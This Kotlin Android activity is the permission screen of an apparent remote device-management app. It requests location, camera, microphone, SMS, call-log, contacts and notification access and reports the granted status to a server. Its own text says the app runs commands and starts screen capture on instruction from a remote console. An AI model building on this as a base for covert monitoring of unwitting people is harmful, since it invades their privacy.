package com.devicemanager.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.animation.*
import androidx.compose.foundation.*
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material.icons.outlined.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.devicemanager.DeviceManagerApp
import com.devicemanager.R
import com.devicemanager.manager.PermissionManager
import com.devicemanager.util.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class PermissionsActivity : ComponentActivity() {

    private lateinit var app: DeviceManagerApp
    private lateinit var permissionManager: PermissionManager
    private val permissionRequestCode = 1001

    private val _permissionsState = mutableStateListOf<PermissionManager.PermissionInfo>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        app = application as DeviceManagerApp
        permissionManager = app.permissionManager

        loadPermissions()

        setContent {
            DeviceManagerTheme {
                PermissionsScreen()
            }
        }
    }

    override fun onResume() {
        super.onResume()
        loadPermissions()
    }

    private fun loadPermissions() {
        val permissions = permissionManager.getAllPermissions()
        _permissionsState.clear()
        _permissionsState.addAll(permissions)
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    fun PermissionsScreen() {
        val context = LocalContext.current

        Scaffold(
            topBar = {
                CenterAlignedTopAppBar(
                    title = {
                        Text(
                            text = "Permission Controls",
                            fontWeight = FontWeight.Bold,
                            fontSize = 20.sp
                        )
                    },
                    navigationIcon = {
                        IconButton(onClick = { finish() }) {
                            Icon(Icons.Default.ArrowBack, contentDescription = "Back")
                        }
                    },
                    colors = TopAppBarDefaults.centerAlignedTopAppBarColors(
                        containerColor = MaterialTheme.colorScheme.background
                    )
                )
            }
        ) { paddingValues ->
            LazyColumn(
                modifier = Modifier
                    .fillMaxSize()
                    .background(MaterialTheme.colorScheme.background)
                    .padding(paddingValues)
                    .padding(horizontal = 20.dp),
                verticalArrangement = Arrangement.spacedBy(12.dp),
                contentPadding = PaddingValues(bottom = 24.dp)
            ) {
                // Info header card
                item {
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(
                            containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f)
                        )
                    ) {
                        Row(
                            modifier = Modifier.padding(16.dp),
                            horizontalArrangement = Arrangement.spacedBy(12.dp),
                            verticalAlignment = Alignment.CenterVertically
                        ) {
                            Icon(
                                imageVector = Icons.Default.Info,
                                contentDescription = "Info",
                                tint = MaterialTheme.colorScheme.primary,
                                modifier = Modifier.size(24.dp)
                            )
                            Text(
                                text = "Granting permissions allows the device management system to safely query device stats, receive locations, and execute commands.",
                                fontSize = 13.sp,
                                color = MaterialTheme.colorScheme.onSurfaceVariant
                            )
                        }
                    }
                }

                // Header permission count
                item {
                    val grantedCount = _permissionsState.count { it.status == "GRANTED" }
                    Text(
                        text = "Module Integration: $grantedCount / ${_permissionsState.size} Granted",
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Bold,
                        color = MaterialTheme.colorScheme.onBackground,
                        modifier = Modifier.padding(top = 8.dp)
                    )
                }

                items(_permissionsState) { permission ->
                    PermissionRowItem(
                        permission = permission,
                        onGrantClicked = { handleGrantClick(permission) }
                    )
                }
            }
        }
    }

    @Composable
    fun PermissionRowItem(
        permission: PermissionManager.PermissionInfo,
        onGrantClicked: () -> Unit
    ) {
        val isGranted = permission.status == "GRANTED"
        
        Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(14.dp),
            colors = CardDefaults.cardColors(
                containerColor = MaterialTheme.colorScheme.surface
            ),
            elevation = CardDefaults.cardElevation(defaultElevation = 1.dp)
        ) {
            Column(
                modifier = Modifier.padding(16.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.spacedBy(8.dp)
                    ) {
                        // Permission Icon selection
                        val icon = when (permission.key) {
                            Constants.PERM_LOCATION -> Icons.Default.MyLocation
                            Constants.PERM_CAMERA -> Icons.Default.CameraAlt
                            Constants.PERM_MICROPHONE -> Icons.Default.Mic
                            Constants.PERM_NOTIFICATIONS -> Icons.Default.Notifications
                            Constants.PERM_CONTACTS -> Icons.Default.Contacts
                            Constants.PERM_CALL_LOG -> Icons.Default.Call
                            Constants.PERM_SMS -> Icons.Default.Sms
                            Constants.PERM_STORAGE -> Icons.Default.FolderShared
                            Constants.PERM_USAGE_ACCESS -> Icons.Default.QueryStats
                            Constants.PERM_NOTIFICATION_ACCESS -> Icons.Default.NotificationImportant
                            else -> Icons.Default.Lock
                        }

                        Box(
                            modifier = Modifier
                                .size(36.dp)
                                .clip(CircleShape)
                                .background(
                                    if (isGranted) Color(0xFFE8F5E9)
                                    else MaterialTheme.colorScheme.primary.copy(alpha = 0.1f)
                                ),
                            contentAlignment = Alignment.Center
                        ) {
                            Icon(
                                imageVector = icon,
                                contentDescription = permission.displayName,
                                tint = if (isGranted) Color(0xFF2E7D32) else MaterialTheme.colorScheme.primary,
                                modifier = Modifier.size(18.dp)
                            )
                        }

                        Text(
                            text = permission.displayName,
                            fontWeight = FontWeight.Bold,
                            fontSize = 15.sp,
                            color = MaterialTheme.colorScheme.onSurface
                        )
                    }

                    // Status Badge
                    val statusLabel = when (permission.status) {
                        "GRANTED" -> "Granted"
                        "REQUIRES_USER_ACTION" -> "Setup Needed"
                        "DENIED" -> "Denied"
                        else -> "N/A"
                    }
                    val statusColor = when (permission.status) {
                        "GRANTED" -> Color(0xFFE8F5E9)
                        "REQUIRES_USER_ACTION" -> Color(0xFFFFF3E0)
                        else -> Color(0xFFFFEBEE)
                    }
                    val statusTextColor = when (permission.status) {
                        "GRANTED" -> Color(0xFF2E7D32)
                        "REQUIRES_USER_ACTION" -> Color(0xFFEF6C00)
                        else -> Color(0xFFC62828)
                    }

                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(6.dp))
                            .background(statusColor)
                            .padding(horizontal = 8.dp, vertical = 2.dp)
                    ) {
                        Text(
                            text = statusLabel,
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = statusTextColor
                        )
                    }
                }

                Text(
                    text = permission.description,
                    fontSize = 12.sp,
                    color = MaterialTheme.colorScheme.onSurfaceVariant
                )

                if (!isGranted) {
                    Box(
                        modifier = Modifier.fillMaxWidth(),
                        contentAlignment = Alignment.CenterEnd
                    ) {
                        Button(
                            onClick = onGrantClicked,
                            shape = RoundedCornerShape(10.dp),
                            colors = ButtonDefaults.buttonColors(
                                containerColor = MaterialTheme.colorScheme.secondary
                            ),
                            contentPadding = PaddingValues(horizontal = 14.dp, vertical = 6.dp),
                            modifier = Modifier.height(34.dp)
                        ) {
                            Text("Grant Access", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }
        }
    }

    private fun handleGrantClick(permission: PermissionManager.PermissionInfo) {
        when (permission.key) {
            Constants.PERM_USAGE_ACCESS -> {
                startActivity(permissionManager.getUsageAccessIntent())
            }
            Constants.PERM_NOTIFICATION_ACCESS -> {
                startActivity(permissionManager.getNotificationAccessIntent())
            }
            Constants.PERM_SCREEN_CAPTURE -> {
                Toast.makeText(
                    this,
                    "Screen capture starts on demand once a live console instruction is sent.",
                    Toast.LENGTH_LONG
                ).show()
            }
            else -> {
                requestDangerousPermission(permission.key)
            }
        }
    }

    private fun requestDangerousPermission(permissionKey: String) {
        val manifestPermission = when (permissionKey) {
            Constants.PERM_LOCATION -> Manifest.permission.ACCESS_FINE_LOCATION
            Constants.PERM_CAMERA -> Manifest.permission.CAMERA
            Constants.PERM_MICROPHONE -> Manifest.permission.RECORD_AUDIO
            Constants.PERM_NOTIFICATIONS -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    Manifest.permission.POST_NOTIFICATIONS
                } else {
                    null
                }
            }
            Constants.PERM_CONTACTS -> Manifest.permission.READ_CONTACTS
            Constants.PERM_CALL_LOG -> Manifest.permission.READ_CALL_LOG
            Constants.PERM_SMS -> Manifest.permission.READ_SMS
            Constants.PERM_STORAGE -> {
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                    Manifest.permission.READ_EXTERNAL_STORAGE
                } else {
                    null
                }
            }
            else -> null
        }

        if (manifestPermission == null) {
            Toast.makeText(this, "Managed automatically on this OS release.", Toast.LENGTH_SHORT).show()
            return
        }

        if (ContextCompat.checkSelfPermission(this, manifestPermission) == PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "Access already active", Toast.LENGTH_SHORT).show()
            loadPermissions()
            return
        }

        ActivityCompat.requestPermissions(
            this,
            arrayOf(manifestPermission),
            permissionRequestCode
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == permissionRequestCode) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Permission denied. Grant it in system settings.", Toast.LENGTH_SHORT).show()
            }
            loadPermissions()
            syncPermissionStatus()
        }
    }

    private fun syncPermissionStatus() {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = app.preferences.deviceId
                if (deviceId.isNotBlank()) {
                    val entries = permissionManager.getPermissionEntries()
                    app.deviceRepository.updatePermissions(deviceId, entries)
                }
            } catch (e: Exception) {
                // Ignore
            }
        }
    }
}
